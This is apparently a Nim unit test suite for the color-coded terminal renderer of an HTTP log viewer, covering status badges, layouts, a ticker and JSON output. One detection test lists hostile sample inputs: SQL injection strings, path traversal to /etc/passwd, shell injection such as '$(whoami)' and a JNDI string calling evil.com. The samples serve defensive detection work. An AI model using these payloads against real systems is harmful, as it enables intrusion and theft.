## Test suite for Phase 06: Terminal Presentation & Color-Coded Rendering Engine
## Category A: Background-Colored HTTP Status Highlighting & Terminal Layouts

import std/[unittest, strutils, options, os, times, sets, json, tables]
import http_logviewer/core/[types, config]
import http_logviewer/enrichment/[geoip, flags]
import http_logviewer/analyzer/correlator
import http_logviewer/renderer/[styles, terminal]

suite "ANSI Status Code Badge Formatter (Phase 06 / Category A / Item 01)":
  test "Item 01: 404 status code formatted with bright white on red background":
    let formatted = formatStatusCode(404, colorize = true)
    check formatted == "\e[41;97;1m 404 \e[0m"
    check formatted.contains("\e[41;97;1m")
    check formatted.contains("404")
    check formatted.endsWith("\e[0m")

  test "Item 01: 401 and 403 Forbidden formatted with white on magenta background":
    let f401 = formatStatusCode(401, colorize = true)
    let f403 = formatStatusCode(403, colorize = true)
    check f401 == "\e[45;97m 401 \e[0m"
    check f403 == "\e[45;97m 403 \e[0m"

  test "Item 01: Other 4xx client errors formatted with red background":
    let f400 = formatStatusCode(400, colorize = true)
    let f429 = formatStatusCode(429, colorize = true)
    check f400 == "\e[41;37m 400 \e[0m"
    check f429 == "\e[41;37m 429 \e[0m"

  test "Item 01: 5xx server errors formatted with bright white on bright red background":
    let f500 = formatStatusCode(500, colorize = true)
    let f502 = formatStatusCode(502, colorize = true)
    let f503 = formatStatusCode(503, colorize = true)
    check f500 == "\e[101;97;1m 500 \e[0m"
    check f502 == "\e[101;97;1m 502 \e[0m"
    check f503 == "\e[101;97;1m 503 \e[0m"

  test "Item 01: 2xx success codes formatted with black text on green background":
    let f200 = formatStatusCode(200, colorize = true)
    let f201 = formatStatusCode(201, colorize = true)
    let f204 = formatStatusCode(204, colorize = true)
    check f200 == "\e[42;30m 200 \e[0m"
    check f201 == "\e[42;30m 201 \e[0m"
    check f204 == "\e[42;30m 204 \e[0m"

  test "Item 01: 3xx redirection codes formatted with black text on yellow background":
    let f301 = formatStatusCode(301, colorize = true)
    let f302 = formatStatusCode(302, colorize = true)
    let f304 = formatStatusCode(304, colorize = true)
    check f301 == "\e[43;30m 301 \e[0m"
    check f302 == "\e[43;30m 302 \e[0m"
    check f304 == "\e[43;30m 304 \e[0m"

  test "Item 01: 1xx and unknown status codes formatted with appropriate fallbacks":
    let f100 = formatStatusCode(100, colorize = true)
    let f999 = formatStatusCode(999, colorize = true)
    check f100 == "\e[44;97m 100 \e[0m"
    check f999 == "\e[100;97m 999 \e[0m"

suite "Terminal Color Auto-Detection (Phase 06 / Category A / Item 02)":
  test "Item 02: NO_COLOR environment variable suppresses color support":
    let orig = getEnv("NO_COLOR")
    putEnv("NO_COLOR", "1")
    check detectColorSupport(some(true)) == false
    check shouldColorize(ColorModeAuto, some(true)) == false
    if orig.len > 0:
      putEnv("NO_COLOR", orig)
    else:
      delEnv("NO_COLOR")

  test "Item 02: TERM=dumb or TERM=raw disables color support":
    let orig = getEnv("TERM")
    let origNoColor = getEnv("NO_COLOR")
    delEnv("NO_COLOR")
    putEnv("TERM", "dumb")
    check detectColorSupport(some(true)) == false
    putEnv("TERM", "raw")
    check detectColorSupport(some(true)) == false
    if orig.len > 0:
      putEnv("TERM", orig)
    else:
      delEnv("TERM")
    if origNoColor.len > 0:
      putEnv("NO_COLOR", origNoColor)

  test "Item 02: Non-TTY output disables color support in auto mode":
    let origNoColor = getEnv("NO_COLOR")
    delEnv("NO_COLOR")
    check detectColorSupport(some(false)) == false
    check shouldColorize(ColorModeAuto, some(false)) == false
    if origNoColor.len > 0:
      putEnv("NO_COLOR", origNoColor)

  test "Item 02: TTY with valid TERM and no NO_COLOR enables color support":
    let origNoColor = getEnv("NO_COLOR")
    let origTerm = getEnv("TERM")
    delEnv("NO_COLOR")
    putEnv("TERM", "xterm-256color")
    check detectColorSupport(some(true)) == true
    check shouldColorize(ColorModeAuto, some(true)) == true
    if origNoColor.len > 0: putEnv("NO_COLOR", origNoColor)
    if origTerm.len > 0: putEnv("TERM", origTerm)

suite "Monochromatic Fallback Mode (Phase 06 / Category A / Item 03)":
  test "Item 03: formatStatusCode in monochromatic mode returns plain text without ANSI escapes":
    check formatStatusCode(404, colorize = false) == " 404 "
    check formatStatusCode(200, colorize = false) == " 200 "
    check formatStatusCode(500, colorize = false) == " 500 "
    check not formatStatusCode(404, colorize = false).contains("\e[")

  test "Item 03: stripAnsi removes all escape sequences":
    let colored = "\e[41;97;1m 404 \e[0m"
    check stripAnsi(colored) == " 404 "
    check stripAnsi("\e[32m[REAL USER]\e[0m") == "[REAL USER]"

  test "Item 03: ColorModeNever policy always forces colorize off":
    check shouldColorize(ColorModeNever, some(true)) == false
    check shouldColorize(ColorModeNever, some(false)) == false

  test "Item 03: ColorModeAlways policy overrides non-TTY and NO_COLOR":
    let origNoColor = getEnv("NO_COLOR")
    putEnv("NO_COLOR", "1")
    check shouldColorize(ColorModeAlways, some(false)) == true
    if origNoColor.len > 0:
      putEnv("NO_COLOR", origNoColor)
    else:
      delEnv("NO_COLOR")

suite "Intent Category Badges (Phase 06 / Category A / Item 04)":
  test "Item 04: RealUser intent badge formatting":
    check formatIntentBadge(CategoryRealUser, colorize = true) == "\e[32m[REAL USER]\e[0m"
    check formatIntentBadge(CategoryRealUser, colorize = false) == "[REAL USER]"

  test "Item 04: VerifiedBot intent badge formatting":
    check formatIntentBadge(CategoryVerifiedBot, colorize = true) == "\e[36m[GOOD BOT ]\e[0m"
    check formatIntentBadge(CategoryVerifiedBot, colorize = false) == "[GOOD BOT ]"

  test "Item 04: FriendlyCrawler intent badge formatting":
    check formatIntentBadge(CategoryFriendlyCrawler, colorize = true) == "\e[36m[FRIENDLY ]\e[0m"
    check formatIntentBadge(CategoryFriendlyCrawler, colorize = false) == "[FRIENDLY ]"

  test "Item 04: CommercialBot intent badge formatting":
    check formatIntentBadge(CategoryCommercialBot, colorize = true) == "\e[33m[SCRAPER  ]\e[0m"
    check formatIntentBadge(CategoryCommercialBot, colorize = false) == "[SCRAPER  ]"

  test "Item 04: SuspiciousScanner intent badge formatting":
    check formatIntentBadge(CategorySuspicious, colorize = true) == "\e[38;5;208m[SUSPICIOUS]\e[0m"
    check formatIntentBadge(CategorySuspicious, colorize = false) == "[SUSPICIOUS]"

  test "Item 04: BadActorHacker intent badge formatting":
    check formatIntentBadge(CategoryBadActorHacker, colorize = true) == "\e[41;97;1m[ HACKER! ]\e[0m"
    check formatIntentBadge(CategoryBadActorHacker, colorize = false) == "[ HACKER! ]"

  test "Item 04: ThreatProfile intent badge overload matches category":
    let threat = initThreatProfile(score = 85, category = CategoryBadActorHacker)
    check formatIntentBadge(threat, colorize = true) == "\e[41;97;1m[ HACKER! ]\e[0m"
    check formatIntentBadge(threat, colorize = false) == "[ HACKER! ]"

suite "Country Flag & Code Column Formatting (Phase 06 / Category A / Item 05)":
  test "Item 05: formatCountryColumn formats emoji flags into aligned 7-width column":
    let colUS = formatCountryColumn("US", "🇺🇸", useEmoji = true, width = 7)
    let colDE = formatCountryColumn("DE", "🇩🇪", useEmoji = true, width = 7)
    let colNL = formatCountryColumn("NL", "🇳🇱", useEmoji = true, width = 7)
    check terminalDisplayWidth(colUS) == 7
    check terminalDisplayWidth(colDE) == 7
    check terminalDisplayWidth(colNL) == 7
    check colUS.startsWith("🇺🇸 US")
    check colDE.startsWith("🇩🇪 DE")
    check colNL.startsWith("🇳🇱 NL")

  test "Item 05: formatCountryColumn formats local private network":
    let colLAN = formatCountryColumn("LO", "🏠", useEmoji = true, width = 7)
    check terminalDisplayWidth(colLAN) == 7
    check colLAN.startsWith("🏠 LO")

  test "Item 05: formatCountryColumn with fallback ASCII brackets":
    let colAscii = formatCountryColumn("US", useEmoji = false, width = 7)
    check colAscii == "[US] US"
    check terminalDisplayWidth(colAscii) == 7

  test "Item 05: GeoLocation overload produces aligned column":
    let geo = initGeoLocation(countryCode = "JP", countryName = "Japan", flagEmoji = "🇯🇵")
    let col = formatCountryColumn(geo, useEmoji = true, width = 7)
    check terminalDisplayWidth(col) == 7
    check col.startsWith("🇯🇵 JP")

suite "ANSI Escape Sequences & String Width Calculations (Phase 06 / Category A / Item 06)":
  test "Item 06: ANSI escape sequences have 0 visual display width":
    let badge = "\e[41;97;1m 404 \e[0m"
    check terminalDisplayWidth(badge) == 5 # " 404 " is 5 chars
    let hackerBadge = "\e[41;97;1m[ HACKER! ]\e[0m"
    check terminalDisplayWidth(hackerBadge) == 11 # "[ HACKER! ]" is 11 chars

  test "Item 06: Unicode regional indicator flag emojis have width 2":
    check terminalDisplayWidth("🇺🇸") == 2
    check terminalDisplayWidth("🇩🇪") == 2
    check terminalDisplayWidth("🇳🇱") == 2
    check terminalDisplayWidth("🇯🇵") == 2
    check terminalDisplayWidth("🇺🇸 US") == 5 # 2 (flag) + 1 (space) + 2 ("US")

  test "Item 06: Standard Unicode emojis have width 2":
    check terminalDisplayWidth("🏠") == 2
    check terminalDisplayWidth("🧅") == 2
    check terminalDisplayWidth("🌐") == 2
    check terminalDisplayWidth("🕵️") == 2 # 2 columns including variation selector

  test "Item 06: alignColumn pads strings accurately regardless of ANSI or emoji content":
    let alignedColored = alignColumn("\e[41;97;1m 404 \e[0m", 10)
    check terminalDisplayWidth(alignedColored) == 10
    check alignedColored.endsWith("     ") # 5 spaces appended

    let alignedEmoji = alignColumn("🇺🇸 US", 10)
    check terminalDisplayWidth(alignedEmoji) == 10
    check alignedEmoji == "🇺🇸 US     " # 5 spaces appended because "🇺🇸 US" has width 5

  test "Item 06: Stream line renderer integrates badges and columns cleanly":
    let entry = initHttpLogEntry(
      clientIp = "194.26.29.112",
      timestamp = parse("2026-10-10 13:55:02", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = "/.env",
      statusCode = 404,
      userAgent = "python-requests/2.28.1"
    )
    let geo = initGeoLocation(countryCode = "DE", flagEmoji = "🇩🇪")
    let threat = initThreatProfile(score = 90, category = CategoryBadActorHacker)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    let coloredLine = renderStreamLine(record, colorize = true, useEmoji = true)
    check coloredLine.contains("13:55:02")
    check coloredLine.contains("🇩🇪 DE")
    check coloredLine.contains("\e[41;97;1m 404 \e[0m")
    check coloredLine.contains("\e[41;97;1m[ HACKER! ]\e[0m")
    check coloredLine.contains("194.26.29.112")
    check coloredLine.contains("GET /.env")

    let monoLine = renderStreamLine(record, colorize = false, useEmoji = false)
    check not monoLine.contains("\e[")
    check monoLine.contains("[ 404 ]") or monoLine.contains(" 404 ")
    check monoLine.contains("[ HACKER! ]")
    check monoLine.contains("[DE] DE")

suite "Formatted Stream Line Output & Headers (Phase 06 / Category B / Item 01)":
  test "Item 01: renderStreamHeader outputs aligned column titles":
    let header = renderStreamHeader(colorize = false, includeUserAgent = true)
    check header.contains("TIME")
    check header.contains("GEO")
    check header.contains("STATUS")
    check header.contains("INTENT")
    check header.contains("CLIENT IP")
    check header.contains("METHOD PATH")
    check header.contains("USER-AGENT")

    let coloredHeader = renderStreamHeader(colorize = true, includeUserAgent = true)
    check coloredHeader.contains("\e[1m") # Bold
    check coloredHeader.contains("\e[36m") # Cyan
    check coloredHeader.endsWith("\e[0m")

  test "Item 01: renderStreamHeader without User-Agent":
    let headerNoUa = renderStreamHeader(colorize = false, includeUserAgent = false)
    check headerNoUa.contains("METHOD PATH")
    check not headerNoUa.contains("USER-AGENT")

  test "Item 01: renderStreamSeparator outputs rule of requested length":
    let sep80 = renderStreamSeparator(80, '-')
    check sep80.len == 80
    check sep80 == repeat('-', 80)

    let sep40 = renderStreamSeparator(40, '=')
    check sep40.len == 40
    check sep40 == repeat('=', 40)

  test "Item 01: renderStreamLine with StreamFormatOptions includes all 7 components":
    let entry = initHttpLogEntry(
      clientIp = "172.56.21.89",
      timestamp = parse("2026-10-10 13:55:01", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = "/blog/welcome",
      statusCode = 200,
      userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    )
    let geo = initGeoLocation(countryCode = "US", flagEmoji = "🇺🇸")
    let threat = initThreatProfile(score = 5, category = CategoryRealUser)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    var opts = defaultStreamFormatOptions()
    opts.colorize = true
    opts.useEmoji = true
    opts.includeUserAgent = true

    let line = renderStreamLine(record, opts)
    check line.contains("13:55:01")
    check line.contains("🇺🇸 US")
    check line.contains("\e[42;30m 200 \e[0m")
    check line.contains("\e[32m[REAL USER]\e[0m")
    check line.contains("172.56.21.89")
    check line.contains("GET /blog/welcome")
    check line.contains("Mozilla/5.0")

  test "Item 01: renderStreamLine with includeUserAgent=false omits UA token":
    let entry = initHttpLogEntry(
      clientIp = "66.249.66.1",
      timestamp = parse("2026-10-10 13:55:04", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = "/robots.txt",
      statusCode = 200,
      userAgent = "Googlebot/2.1 (+http://www.google.com/bot.html)"
    )
    let geo = initGeoLocation(countryCode = "US", flagEmoji = "🇺🇸")
    let threat = initThreatProfile(score = 0, category = CategoryVerifiedBot)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    let lineNoUa = renderStreamLine(record, colorize = false, useEmoji = false, includeUserAgent = false)
    check lineNoUa.contains("66.249.66.1")
    check lineNoUa.contains("GET /robots.txt")
    check not lineNoUa.contains("Googlebot")

suite "Column Truncation & Path Shortening (Phase 06 / Category B / Item 02)":
  test "Item 02: shortenPath middle-truncates long URIs":
    let longPath = "/api/v1/organizations/corp/projects/default/deployments/production/health"
    let shortened = shortenPath(longPath, 25)
    check shortened.len <= 25
    check shortened.startsWith("/api")
    check shortened.contains("...")
    check shortened.endsWith("health")

    # Short path is unmodified
    check shortenPath("/index.html", 25) == "/index.html"
    # Bound edge cases
    check shortenPath("/abc", 2) == ".."
    check shortenPath("/abc", 3) == "..."

  test "Item 02: truncateText bounds strings and appends ellipsis":
    let text = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0"
    let truncated = truncateText(text, 20)
    check truncated.len == 20
    check truncated.endsWith("...")
    check truncateText("Short", 20) == "Short"

  test "Item 02: truncateAnsi truncates visually without corrupting escape codes":
    let colored = "\e[41;97;1m 404 \e[0m \e[32m[REAL USER]\e[0m \e[1mGET /very/long/path/to/resource\e[0m"
    let truncated = truncateAnsi(colored, 30)
    check terminalDisplayWidth(truncated) <= 30
    check truncated.endsWith("\e[0m")
    check truncated.contains("...")

  test "Item 02: getEffectiveTerminalWidth uses override or fallback":
    check getEffectiveTerminalWidth(overrideWidth = 95) == 95
    let eff = getEffectiveTerminalWidth(fallback = 100)
    check eff > 0

  test "Item 02: renderStreamLine respects maxWidth=80 constraints":
    let entry = initHttpLogEntry(
      clientIp = "185.220.101.5",
      timestamp = parse("2026-10-10 13:55:02", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = "/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css",
      statusCode = 404,
      userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
    )
    let geo = initGeoLocation(countryCode = "NL", flagEmoji = "🇳🇱")
    let threat = initThreatProfile(score = 85, category = CategoryBadActorHacker)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    let line80 = renderStreamLine(record, colorize = true, useEmoji = true, maxWidth = 80)
    check terminalDisplayWidth(line80) <= 80

    let monoLine80 = renderStreamLine(record, colorize = false, useEmoji = false, maxWidth = 80)
    check terminalDisplayWidth(monoLine80) <= 80
    check monoLine80.len <= 80

  test "Item 02: renderStreamLine respects maxWidth=120 constraints with User-Agent":
    let entry = initHttpLogEntry(
      clientIp = "194.26.29.112",
      timestamp = parse("2026-10-10 13:55:02", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = "/actuator/env",
      statusCode = 404,
      userAgent = "python-requests/2.28.1 (Security scanner test payload)"
    )
    let geo = initGeoLocation(countryCode = "DE", flagEmoji = "🇩🇪")
    let threat = initThreatProfile(score = 90, category = CategoryBadActorHacker)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    let line120 = renderStreamLine(record, colorize = true, useEmoji = true, maxWidth = 120)
    check terminalDisplayWidth(line120) <= 120
    check line120.contains("194.26.29.112")
    check line120.contains("GET /actuator/env")

suite "Live Status Ticker & Summary Banner (Phase 06 / Category B / Item 03)":
  test "Item 03: StatusTicker records events and updates counters accurately":
    var ticker = initStatusTicker()
    check ticker.totalLines == 0
    check ticker.realUsers == 0
    check ticker.hackers == 0

    let entry1 = initHttpLogEntry(clientIp = "1.2.3.4", path = "/index.html", statusCode = 200)
    let rec1 = initEnrichedLogRecord(entry1, threat = initThreatProfile(score = 0, category = CategoryRealUser))
    ticker.record(rec1)

    let entry2 = initHttpLogEntry(clientIp = "5.6.7.8", path = "/.env", statusCode = 404)
    let rec2 = initEnrichedLogRecord(entry2, threat = initThreatProfile(score = 90, category = CategoryBadActorHacker))
    ticker.record(rec2)

    let entry3 = initHttpLogEntry(clientIp = "9.10.11.12", path = "/.env", statusCode = 404)
    let rec3 = initEnrichedLogRecord(entry3, threat = initThreatProfile(score = 90, category = CategoryBadActorHacker))
    ticker.record(rec3)

    let entry4 = initHttpLogEntry(clientIp = "66.249.66.1", path = "/robots.txt", statusCode = 200)
    let rec4 = initEnrichedLogRecord(entry4, threat = initThreatProfile(score = 0, category = CategoryVerifiedBot))
    ticker.record(rec4)

    check ticker.totalLines == 4
    check ticker.realUsers == 1
    check ticker.hackers == 2
    check ticker.verifiedBots == 1
    check ticker.totalBots == 1
    check ticker.uniqueIps.len == 4
    check ticker.hackerRatio() == 0.5

  test "Item 03: getTopAttackPaths orders probed endpoints by frequency":
    var ticker = initStatusTicker()
    for _ in 1..5:
      let rec = initEnrichedLogRecord(initHttpLogEntry(path = "/.env", statusCode = 404), threat = initThreatProfile(score = 90, category = CategoryBadActorHacker))
      ticker.record(rec)
    for _ in 1..3:
      let rec = initEnrichedLogRecord(initHttpLogEntry(path = "/wp-login.php", statusCode = 404), threat = initThreatProfile(score = 80, category = CategoryBadActorHacker))
      ticker.record(rec)
    for _ in 1..1:
      let rec = initEnrichedLogRecord(initHttpLogEntry(path = "/xmlrpc.php", statusCode = 404), threat = initThreatProfile(score = 70, category = CategoryBadActorHacker))
      ticker.record(rec)

    let topPaths = ticker.getTopAttackPaths(3)
    check topPaths.len == 3
    check topPaths[0].path == "/.env"
    check topPaths[0].count == 5
    check topPaths[1].path == "/wp-login.php"
    check topPaths[1].count == 3
    check topPaths[2].path == "/xmlrpc.php"
    check topPaths[2].count == 1

  test "Item 03: renderTicker produces compact status line with colors and fallback":
    var ticker = initStatusTicker()
    let rec1 = initEnrichedLogRecord(initHttpLogEntry(path = "/home", statusCode = 200), threat = initThreatProfile(score = 0, category = CategoryRealUser))
    let rec2 = initEnrichedLogRecord(initHttpLogEntry(path = "/.env", statusCode = 404), threat = initThreatProfile(score = 90, category = CategoryBadActorHacker))
    ticker.record(rec1)
    ticker.record(rec2)

    let monoTicker = renderTicker(ticker, colorize = false)
    check monoTicker.contains("[STATUS]")
    check monoTicker.contains("Parsed: 2")
    check monoTicker.contains("Real: 1")
    check monoTicker.contains("Hackers: 1")
    check monoTicker.contains("/.env (1)")
    check not monoTicker.contains("\e[")

    let coloredTicker = renderTicker(ticker, colorize = true)
    check coloredTicker.contains("\e[")
    check coloredTicker.contains("[STATUS]")
    check coloredTicker.contains("Parsed:")

  test "Item 03: renderSummaryBanner outputs structured traffic summary":
    var ticker = initStatusTicker()
    let rec = initEnrichedLogRecord(initHttpLogEntry(clientIp = "185.220.101.5", path = "/.env", statusCode = 404), threat = initThreatProfile(score = 90, category = CategoryBadActorHacker))
    ticker.record(rec)

    let banner = renderSummaryBanner(ticker, colorize = false, width = 60)
    check banner.contains("HTTP LOGVIEWER - SESSION TRAFFIC SUMMARY")
    check banner.contains("Total Lines Ingested : 1")
    check banner.contains("Unique Client IPs    : 1")
    check banner.contains("Rogue Hackers        : 1")
    check banner.contains("Total 404 Responses  : 1")
    check banner.contains("/.env (1 requests)")

suite "Suspicious URI Parameter Highlighting & Diffing (Phase 06 / Category B / Item 04)":
  test "Item 04: isSuspiciousParamValue flags OWASP exploit patterns":
    check isSuspiciousParamValue("1+union+select+1,2,3")
    check isSuspiciousParamValue("' or '1'='1")
    check isSuspiciousParamValue("../../etc/passwd")
    check isSuspiciousParamValue(";id")
    check isSuspiciousParamValue("$(whoami)")
    check isSuspiciousParamValue("${jndi:ldap://evil.com/a}")
    check isSuspiciousParamValue(".env")
    check isSuspiciousParamValue("wp-login.php")
    check not isSuspiciousParamValue("shoes")
    check not isSuspiciousParamValue("page_2")
    check not isSuspiciousParamValue("en-US")

  test "Item 04: highlightSuspiciousUri highlights exploit parameter values":
    let cleanUri = "/search?q=shoes&category=apparel"
    check highlightSuspiciousUri(cleanUri, colorize = false) == cleanUri

    let attackUri = "/search?q=1+union+select+1,2,3&category=apparel"
    let coloredAttack = highlightSuspiciousUri(attackUri, colorize = true)
    check coloredAttack.contains("\e[41;97;1m") # Red bold background on exploit
    check coloredAttack.contains("1+union+select+1,2,3")
    check coloredAttack.contains("category")

  test "Item 04: highlightSuspiciousUri highlights sensitive file endpoints":
    let envUri = "/.env"
    let coloredEnv = highlightSuspiciousUri(envUri, colorize = true)
    check coloredEnv.contains("\e[41;37m") # Dark red bg
    check coloredEnv.contains("/.env")

  test "Item 04: highlightUriDiff highlights newly injected and modified parameters":
    let baseline = "/search?q=laptop&sort=asc"
    let attack = "/search?q=laptop' union select 1,2,3--&sort=asc&cmd=;id"

    let diff = highlightUriDiff(baseline, attack, colorize = true)
    check diff.contains("+cmd=;id") # Newly added parameter
    check diff.contains("\e[91;1m") # Bright red bold for added param
    check diff.contains("\e[41;97;1m") # Bold red background for modified SQLi payload
    check diff.contains("sort=asc") # Preserved baseline param

  test "Item 04: renderStreamLine highlights suspicious URIs in stream lines":
    let entry = initHttpLogEntry(
      clientIp = "194.26.29.112",
      `method` = HttpGet,
      path = "/search?q=1+union+select+1,2,3",
      statusCode = 500
    )
    let threat = initThreatProfile(score = 85, category = CategoryBadActorHacker)
    let record = initEnrichedLogRecord(entry, threat = threat)

    var opts = defaultStreamFormatOptions()
    opts.colorize = true
    opts.highlightSuspicious = true

    let line = renderStreamLine(record, opts)
    check line.contains("\e[41;97;1m") # Contains red background highlight on SQLi
    check line.contains("union")

suite "JSON Output Mode & SIEM Pipeline Serialization (Phase 06 / Category B / Item 05)":
  test "Item 05: renderJsonRecord produces valid compact single-line JSON":
    let entry = initHttpLogEntry(
      clientIp = "185.220.101.5",
      timestamp = parse("2026-10-10 13:55:02", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpPost,
      path = "/wp-login.php",
      statusCode = 404,
      bytesSent = 1024,
      referer = "https://example.com",
      userAgent = "Masscan/1.3"
    )
    let geo = initGeoLocation(countryCode = "NL", countryName = "Netherlands", flagEmoji = "🇳🇱")
    let threat = initThreatProfile(score = 85, category = CategoryBadActorHacker, flags = {ThreatCmsExploit})
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat, clusterId = some("ACTOR-WP"))

    let jsonStr = renderJsonRecord(record, pretty = false)
    check not jsonStr.contains("\n")
    let parsed = parseJson(jsonStr)

    check parsed.hasKey("entry")
    check parsed.hasKey("geo")
    check parsed.hasKey("threat")
    check parsed.hasKey("clusterId")

    check parsed["entry"]["clientIp"].getStr() == "185.220.101.5"
    check parsed["entry"]["path"].getStr() == "/wp-login.php"
    check parsed["entry"]["statusCode"].getInt() == 404
    check parsed["geo"]["countryCode"].getStr() == "NL"
    check parsed["threat"]["category"].getStr() == "BAD_ACTOR_HACKER"
    check parsed["clusterId"].getStr() == "ACTOR-WP"

  test "Item 05: renderJsonRecord with pretty=true outputs multi-line indented JSON":
    let entry = initHttpLogEntry(clientIp = "1.2.3.4", path = "/index.html", statusCode = 200)
    let record = initEnrichedLogRecord(entry)
    let prettyStr = renderJsonRecord(record, pretty = true)
    check prettyStr.contains("\n")
    check prettyStr.contains("  \"entry\": {")

  test "Item 05: renderJsonStreamLine outputs parseable NDJSON line":
    let entry = initHttpLogEntry(clientIp = "8.8.8.8", path = "/dns-query", statusCode = 200)
    let record = initEnrichedLogRecord(entry)
    let streamLine = renderJsonStreamLine(record)
    let parsed = parseJson(streamLine)
    check parsed["entry"]["clientIp"].getStr() == "8.8.8.8"

  test "Item 05: renderJsonEntry formats raw HttpLogEntry":
    let entry = initHttpLogEntry(clientIp = "10.0.0.1", path = "/health", statusCode = 200)
    let jsonEntry = renderJsonEntry(entry, pretty = false)
    let parsed = parseJson(jsonEntry)
    check parsed["clientIp"].getStr() == "10.0.0.1"
    check parsed["statusCode"].getInt() == 200

  test "Item 05: renderJsonBatch produces NDJSON and JSON array representations":
    let rec1 = initEnrichedLogRecord(initHttpLogEntry(clientIp = "1.1.1.1", path = "/a", statusCode = 200))
    let rec2 = initEnrichedLogRecord(initHttpLogEntry(clientIp = "2.2.2.2", path = "/b", statusCode = 404))

    let ndjson = renderJsonBatch([rec1, rec2], pretty = false)
    let lines = ndjson.splitLines()
    check lines.len == 2
    check parseJson(lines[0])["entry"]["clientIp"].getStr() == "1.1.1.1"
    check parseJson(lines[1])["entry"]["clientIp"].getStr() == "2.2.2.2"

    let jsonArrayStr = renderJsonBatch([rec1, rec2], pretty = true)
    let parsedArr = parseJson(jsonArrayStr)
    check parsedArr.kind == JArray
    check parsedArr.len == 2

suite "Terminal Layout Rendering Across Displays (Phase 06 / Category B / Item 06)":
  test "Item 06: 80-column display constraints on header, lines, and ticker":
    let header80 = renderStreamHeader(colorize = true, maxWidth = 80)
    check terminalDisplayWidth(header80) <= 80

    let sep80 = renderStreamSeparator(80)
    check sep80.len == 80
    check terminalDisplayWidth(sep80) == 80

    let entry = initHttpLogEntry(
      clientIp = "194.26.29.112",
      timestamp = parse("2026-10-10 13:55:02", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = "/wp-content/themes/twentytwenty/templates/very/deep/nested/page/resource.html",
      statusCode = 404,
      userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
    )
    let geo = initGeoLocation(countryCode = "DE", flagEmoji = "🇩🇪")
    let threat = initThreatProfile(score = 90, category = CategoryBadActorHacker)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    # Colored line in 80-col
    let colored80 = renderStreamLine(record, colorize = true, useEmoji = true, maxWidth = 80)
    check terminalDisplayWidth(colored80) <= 80
    check colored80.contains("194.26.29.112")
    check colored80.contains("\e[41;97;1m 404 \e[0m")

    # Monochromatic line in 80-col
    let mono80 = renderStreamLine(record, colorize = false, useEmoji = false, maxWidth = 80)
    check terminalDisplayWidth(mono80) <= 80
    check mono80.len <= 80
    check not mono80.contains("\e[")

    # Ticker in 80-col
    var ticker = initStatusTicker()
    ticker.record(record)
    let ticker80 = renderTicker(ticker, colorize = true, maxWidth = 80)
    check terminalDisplayWidth(ticker80) <= 80

  test "Item 06: 120-column standard terminal layout rendering":
    let header120 = renderStreamHeader(colorize = true, maxWidth = 120)
    check terminalDisplayWidth(header120) <= 120
    check header120.contains("USER-AGENT")

    let entry = initHttpLogEntry(
      clientIp = "185.220.101.5",
      timestamp = parse("2026-10-10 13:55:03", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpPost,
      path = "/api/v1/authentication/login-portal",
      statusCode = 401,
      userAgent = "curl/7.88.1 (x86_64-pc-linux-gnu) libcurl/7.88.1 OpenSSL/3.0.8"
    )
    let geo = initGeoLocation(countryCode = "NL", flagEmoji = "🇳🇱")
    let threat = initThreatProfile(score = 45, category = CategorySuspicious)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    let line120 = renderStreamLine(record, colorize = true, useEmoji = true, maxWidth = 120)
    check terminalDisplayWidth(line120) <= 120
    check line120.contains("185.220.101.5")
    check line120.contains("POST /api/v1/authentication/login-portal")
    check line120.contains("curl/7.88.1")

    let monoLine120 = renderStreamLine(record, colorize = false, useEmoji = false, maxWidth = 120)
    check terminalDisplayWidth(monoLine120) <= 120
    check monoLine120.len <= 120
    check not monoLine120.contains("\e[")

  test "Item 06: Ultra-wide display (160 and 200 columns) preserves full URIs and User-Agents":
    let longPath = "/v2/customer-dashboard/analytics/reports/monthly-summary-archive-export.json?range=all&format=full"
    let longUa = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
    let moderateUa = "Mozilla/5.0 (X11; Linux x86_64)"

    let entry = initHttpLogEntry(
      clientIp = "172.56.21.89",
      timestamp = parse("2026-10-10 13:55:01", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = longPath,
      statusCode = 200,
      userAgent = moderateUa
    )
    let geo = initGeoLocation(countryCode = "US", flagEmoji = "🇺🇸")
    let threat = initThreatProfile(score = 0, category = CategoryRealUser)
    let record = initEnrichedLogRecord(entry = entry, geo = geo, threat = threat)

    # 200-col display preserves long path and moderate UA
    let line200 = renderStreamLine(record, colorize = true, useEmoji = true, maxWidth = 200)
    check terminalDisplayWidth(line200) <= 200
    check line200.contains(longPath)
    check line200.contains(moderateUa)

    # 300-col display preserves long path and 124-char full UA
    let fullEntry = initHttpLogEntry(
      clientIp = "172.56.21.89",
      timestamp = parse("2026-10-10 13:55:01", "yyyy-MM-dd HH:mm:ss"),
      `method` = HttpGet,
      path = longPath,
      statusCode = 200,
      userAgent = longUa
    )
    let fullRecord = initEnrichedLogRecord(entry = fullEntry, geo = geo, threat = threat)
